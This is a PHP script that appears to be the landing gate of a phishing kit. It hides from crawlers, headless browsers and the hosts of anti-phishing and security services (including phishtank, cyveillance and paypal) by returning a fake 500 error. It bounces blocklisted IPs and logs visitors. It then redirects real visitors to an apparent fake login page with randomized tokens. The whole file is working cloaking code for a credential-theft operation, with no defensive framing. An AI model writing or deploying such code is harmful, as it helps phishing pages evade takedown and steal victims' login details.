<?php
session_start();
error_reporting(0);


include "control.php";


if (!empty($_SERVER['HTTP_CLIENT_IP']))  
    {

      $vis_ip=$_SERVER['HTTP_CLIENT_IP'];
    }
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))   
    {
      $vis_ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
    }
    else
    {
      $vis_ip=$_SERVER['REMOTE_ADDR'];
    }
$agent=$_SERVER['HTTP_USER_AGENT'];

$bots_ua = '/BotLink|bingbot|AhrefsBot|ahoy|AlkalineBOT|anthill|appie|arale|araneo|AraybOt|ariadne|arks|ATN_Worldwide|Atomz|bbot|Bjaaland|Ukonline|borg\-bot\/0\.9|boxseabot|bspider|calif|christcrawler|CMC\/0\.01|combine|confuzzledbot|CoolBot|cosmos|Internet Cruiser Robot|cusco|cyberspyder|cydralspider|desertrealm, desert realm|digger|DIIbot|grabber|downloadexpress|DragonBot|dwcp|ecollector|ebiness|elfinbot|esculapio|esther|fastcrawler|FDSE|FELIX IDE|ESI|fido|H?m?h?kki|KIT\-Fireball|fouineur|Freecrawl|gammaSpider|gazz|gcreep|golem|googlebot|Googlebot|griffon|Gromit|gulliver|gulper|hambot|havIndex|hotwired|htdig|iajabot|INGRID\/0\.1|Informant|InfoSpiders|inspectorwww|irobot|Iron33|JBot|jcrawler|Teoma|Jeeves|jobo|image\.kapsi\.net|KDD\-Explorer|ko_yappo_robot|label\-grabber|larbin|legs|Linkidator|linkwalker|Lockon|logo_gif_crawler|marvin|mattie|mediafox|MerzScope|NEC\-MeshExplorer|MindCrawler|udmsearch|moget|Motor|msnbot|muncher|muninn|MuscatFerret|MwdSearch|sharp\-info\-agent|WebMechanic|NetScoop|newscan\-online|ObjectsSearch|Occam|Orbsearch\/1\.0|packrat|pageboy|ParaSite|patric|pegasus|perlcrawler|phpdig|piltdownman|Pimptrain|pjspider|PlumtreeWebAccessor|PortalBSpider|psbot|Getterrobo\-Plus|Raven|RHCS|RixBot|roadrunner|Robbie|robi|RoboCrawl|robofox|Scooter|Search\-AU|searchprocess|Senrigan|Shagseeker|sift|SimBot|Site Valet|skymob|SLCrawler\/2\.0|slurp|ESI|snooper|solbot|speedy|spider_monkey|SpiderBot\/1\.0|spiderline|nil|suke|http:\/\/www\.sygol\.com|tach_bw|TechBOT|templeton|titin|topiclink|UdmSearch|urlck|Valkyrie libwww\-perl|verticrawl|Victoria|void\-bot|Voyager|VWbot_K|crawlpaper|wapspider|WebBandit\/1\.0|webcatcher|T\-H\-U\-N\-D\-E\-R\-S\-T\-O\-N\-E|WebMoose|webquest|webreaper|webs|webspider|WebWalker|wget|winona|whowhere|wlm|WOLP|WWWC|none|XGET|Nederland\.zoek|AISearchBot|woriobot|NetSeer|Nutch|YandexBot|YandexMobileBot|SemrushBot|FatBot|MJ12bot|DotBot|AddThis|baiduspider|SeznamBot|mod_pagespeed|CCBot|openstat.ru\/Bot|m2e|google|mediapartners|Ipad Iphone Safari|Python-urllib|HeadlessChrome|PhantomJS|Darwin|Dalvik|zgrab\/0.x|BingPreview\/1.0b|^$/i';
$bots_host="/above|google|softlayer|cyveillance|phishtank|dreamhost|netpilot|calyxinstitute|tor-exit|paypal/i";
if(preg_match($bots_ua, $agent) || preg_match($bots_host, gethostbyaddr($vis_ip)) || $agent=="Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727)" ||  !filter_var( $vis_ip, FILTER_VALIDATE_IP ))
{
	
	header($_SERVER['SERVER_PROTOCOL'] . ' 500 Internal Server Error', true, 500);
	die("<h1>500 Internal Server Error</h1>");
}

$data   = file_get_contents('ips.txt'); 
if (strpos($data, "\r\n") !== false) {
    $data   = explode("\r\n", $data);
}
else
{
$data   = explode("\n", $data);
}




if (in_array($vis_ip,$data))
{ echo '<html><head><meta http-equiv="refresh" content="0;URL='.$out_url.'" /></head><body></body></html>';
die();
}






if($pageonline == 0)
{
die();
}

if($ip_logger == 1)
{
include "ips.php";
}
if($country_block == 1)
{
	include "country.php";
}



$_SESSION["valid"]=1;


$agent=$_SERVER['HTTP_USER_AGENT'];
$time = gmdate ("H:i:s d-n-Y");
$file=fopen("visits.txt","a+"); 
          fwrite($file,$_SERVER['SERVER_NAME']." - ".$vis_ip ." - ". $agent. " - ".$time."\r\n");
fclose($file);


echo '<!DOCTYPE HTML>
<html>
<head>
<meta http-equiv="refresh" content="0;URL=idv.Log.php?ud=dashbrd&idv.cmd=LOGIN&accessU='.md5(rand(1,100)).'&ID='.randomChaSp(rand(40,60)).'" />
</head>
<body>
&nbsp;
</body>
</html>';
?>